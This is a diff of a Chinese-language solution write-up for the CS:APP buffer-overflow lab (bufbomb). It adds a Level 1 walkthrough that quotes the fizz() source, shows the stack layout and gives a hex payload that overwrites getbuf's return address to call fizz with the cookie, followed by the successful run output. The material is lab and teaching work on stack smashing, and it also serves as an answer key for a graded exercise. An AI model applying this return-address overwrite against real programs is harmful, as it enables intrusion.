@@ -4,7 +4,7 @@
 
 以下是我的解题过程
 
-### Level 0
+### Level 0: Candle (10 pts)
 
 这一步的要求很简单，根据 `buflab.pdf` 有如下 test 函数：
 
@@ -94,6 +94,58 @@ $ ./hex2raw < 0_smoke_hex.txt | ./bufbomb -u bovik
 Userid: bovik
 Cookie: 0x1005b2b7
 Type string:Smoke!: You called smoke()
+VALID
+NICE JOB!
+```
+
+### Level 1: Sparkler (10 pts)
+
+这一步要求是 `getbuf` 返回时调用 `fizz` 函数，并将入参 `val` 设置为 `cookie`：
+
+```c
+void fizz(int val)
+{
+  if (val == cookie) {
+    printf("Fizz!: You called fizz(0x%x)\n", val);
+    validate(1);
+  } else
+    printf("Misfire: You called fizz(0x%x)\n", val);
+  exit(0);
+}
+```
+
+由于，我们不是真正通过 `call` 指令调用 `fizz` 函数的，因此需要在跳转到 `fizz` 函数前构造好调用栈，以下是 `Gets` 返回后 `getbuf` 的栈帧示意值：
+
+![](images/02_24_level_1_stack.svg)
+
+**图 2：调用 Gets 后的 getbuf 的栈帧情况**
+
+通过反汇编可知 `fizz` 函数所在地址：
+
+```x86asm
+08048c42 <fizz>:
+```
+
+以 
+
+```
+Userid: bovik
+Cookie: 0x1005b2b7
+```
+
+为例，我们需要构造如下输入：
+
+```
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08  00 00 00 00 b7 b2 05 10
+```
+
+假设上述的输入序列已经保存在文件 `1_fizz_hex.txt` 可使用如下命令，验证：
+
+```bash
+$ ./hex2raw < 1_fizz_hex.txt | ./bufbomb -u bovik
+Userid: bovik
+Cookie: 0x1005b2b7
+Type string:Fizz!: You called fizz(0x1005b2b7)
 VALID
 NICE JOB!
 ```
